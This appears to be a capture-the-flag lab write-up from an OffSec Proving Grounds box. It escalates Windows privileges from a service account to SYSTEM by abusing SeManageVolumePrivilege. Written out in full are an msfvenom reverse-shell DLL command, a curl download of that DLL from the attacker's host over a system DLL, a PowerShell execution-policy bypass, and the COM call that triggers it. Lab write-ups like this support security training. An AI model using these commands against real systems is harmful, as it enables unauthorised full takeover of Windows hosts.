# svc_mssql -> System
`whoami /priv`

```
Privilege Name                Description                      State
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

SeMachineAccountPrivilege and SeManageVolumePrivilege are new compared to svc_apache.

I found [an exploit](https://github.com/CsEnox/SeManageVolumeExploit) relating to SeManageVolumePrivilege. Our state is disabled, which threw me off at first, but the README.md does note that it first "Enables the privilege in the token".

As it says, we'll replace `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll` with a malicious payload. I'll create it on my attacking system with:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o Printconfig.dll`

Then we can copy this, as well as SeManageVolumeExploit.exe from the exploit's GitHub release to the target.

Then run
`.\SeManageVolumeExploit.exe`

![[Pasted image 20250802090851.png]]

At this point, we have full access to the entire C: drive so we can already read the final flag from `C:\Users\Administrator\Desktop\proof.txt`, but we can truly finish the box by getting a root shell.

`powershell -ep bypass`

Backup current dll file:
`cp C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll.bak`

Overwrite active file:
`curl 'http://192.168.45.155:443/Printconfig.dll' -o C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`

Test by executing PowerShell commands from README
`$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")`

`$object = [Activator]::CreateInstance($type)`

![[Pasted image 20250802112631.png]]

[[Archive/OFFSEC - Proving Grounds Writeups/Windows/Access/Findings|Findings]]